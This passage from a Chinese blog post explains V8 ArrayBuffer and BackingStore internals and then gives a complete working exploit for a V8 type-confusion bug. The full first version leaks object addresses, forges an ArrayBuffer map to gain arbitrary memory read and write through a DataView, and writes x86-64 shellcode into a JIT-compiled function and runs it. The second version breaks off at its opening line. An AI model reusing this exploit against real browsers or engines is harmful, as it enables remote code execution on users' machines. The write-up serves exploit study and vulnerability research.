ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef</li></ul>  <strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong><ul><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]</li></ul>  <strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br>  <strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li><strong>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""></li></ul></li></ul><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>我写了两个版本的exp，思路一样，但是写法稍微有点不同，版本一相对简洁舒服一些，版本二感觉会稳定一点。</p><h4 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1024</span> * <span class="number">1024</span> *<span class="number">16</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_to_float</span>(<span class="params">intarr,floatarr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; intarr.length;i = i+<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> re = d2u(intarr[i+<span class="number">1</span>],intarr[i]);</span><br><span class="line">        floatarr[j] = re;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nop = <span class="number">0xdaba0000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造ArrayBuffer的map</span></span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    nop,nop,</span><br><span class="line">    <span class="number">0x0f00000a</span>,<span class="number">0x001900c6</span>,<span class="number">0x082003ff</span>,<span class="number">0x0</span>,</span><br><span class="line">    nop,nop,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    nop,nop,<span class="number">0x0</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=read_obj_addr(ab.__proto__);</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//用ab_proto_addr和ab_constructor_addr替换fake map中的nop</span></span><br><span class="line">ab_map_obj[<span class="number">0x6</span>] = ab_proto_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x7</span>] = ab_proto_addr / <span class="number">0x100000000</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x8</span>] = ab_constructor_addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">ab_map_obj[<span class="number">0x9</span>] = ab_constructor_addr / <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab_map_obj_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line"><span class="comment">// 将int array转换成double array</span></span><br><span class="line">change_to_float(ab_map_obj,ab_map_obj_float);</span><br><span class="line"><span class="comment">// 此处gc是为了将ab_map_obj_float放入到old space里，</span></span><br><span class="line"><span class="comment">// 如果没有gc则ab_map_obj_float会在后续的leak中由于gc而被迁移</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj_float的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj_float);</span><br><span class="line"><span class="comment">// leak ab_map_obj_float的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">ab_map_obj_addr=read_obj_addr1(ab_map_obj_float)+<span class="number">0x280</span>+<span class="number">0x10</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    ab_map_obj_addr &amp; <span class="number">0xffffffff</span>, ab_map_obj_addr / <span class="number">0x100000000</span>,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x4000</span>, <span class="comment">/* buffer length */</span></span><br><span class="line">    <span class="number">0x12345678</span>,<span class="number">0x123</span>,<span class="comment">/* buffer address */</span></span><br><span class="line">    <span class="number">0x4</span>,<span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> fake_ab_float = [<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>,<span class="number">1.1</span>];</span><br><span class="line">change_to_float(fake_ab,fake_ab_float);</span><br><span class="line">gc();</span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab_float的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab_float);</span><br><span class="line">fake_ab_float_addr=read_obj_addr2(fake_ab_float)+<span class="number">0x300</span>+<span class="number">0x10</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr_f = d2u(fake_ab_float_addr / <span class="number">0x100000000</span>,fake_ab_float_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">print(fake_ab_float_addr_f + <span class="string">'\n\n\n'</span>);</span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr_f);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr_f);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=u2d(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=read_obj_addr3(evil_f)+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read32</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    <span class="comment">//get方法的参数都是一个字节序号（不能是负数，否则会报错），表示从哪个字节开始读取。</span></span><br><span class="line">    <span class="comment">//如果一次读取两个或两个以上字节，就必须明确数据的存储方式，到底是小端字节序还是大端字节序。</span></span><br><span class="line">    <span class="comment">//默认情况下，DataView的get方法使用大端字节序解读数据，如果需要使用小端字节序解读，必须在get方法的第二个参数指定true。</span></span><br><span class="line">    <span class="keyword">return</span> fake_dv.getUint32(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Write32</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">    fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    print(<span class="string">"write"</span>);</span><br><span class="line">    fake_dv.setUint32(<span class="number">0</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+<span class="number">0x4</span>) * <span class="number">0x100000000</span>;;</span><br><span class="line">print(shellcode_address.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> addr = shellcode_address<span class="number">-1</span>+<span class="number">0x60</span>;</span><br><span class="line">fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="comment">// shellcode[0] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[1] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[2] = 0x782fb848;</span></span><br><span class="line"><span class="comment">// shellcode[3] = 0x636c6163;</span></span><br><span class="line"><span class="comment">// shellcode[4] = 0x48500000;</span></span><br><span class="line"><span class="comment">// shellcode[5] = 0x73752fb8;</span></span><br><span class="line"><span class="comment">// shellcode[6] = 0x69622f72;</span></span><br><span class="line"><span class="comment">// shellcode[7] = 0x8948506e;</span></span><br><span class="line"><span class="comment">// shellcode[8] = 0xc03148e7;</span></span><br><span class="line"><span class="comment">// shellcode[9] = 0x89485750;</span></span><br><span class="line"><span class="comment">// shellcode[10] = 0xd23148e6;</span></span><br><span class="line"><span class="comment">// shellcode[11] = 0x3ac0c748;</span></span><br><span class="line"><span class="comment">// shellcode[12] = 0x50000030;</span></span><br><span class="line"><span class="comment">// shellcode[13] = 0x4944b848;</span></span><br><span class="line"><span class="comment">// shellcode[14] = 0x414c5053;</span></span><br><span class="line"><span class="comment">// shellcode[15] = 0x48503d59;</span></span><br><span class="line"><span class="comment">// shellcode[16] = 0x3148e289;</span></span><br><span class="line"><span class="comment">// shellcode[17] = 0x485250c0;</span></span><br><span class="line"><span class="comment">// shellcode[18] = 0xc748e289;</span></span><br><span class="line"><span class="comment">// shellcode[19] = 0x00003bc0;</span></span><br><span class="line"><span class="comment">// shellcode[20] = 0x050f00;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure><h4 id="版本2-工具类在上面"><a href="#版本2-工具类在上面" class="headerlink" title="版本2(工具类在上面)"></a>版本2(工具类在上面)</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 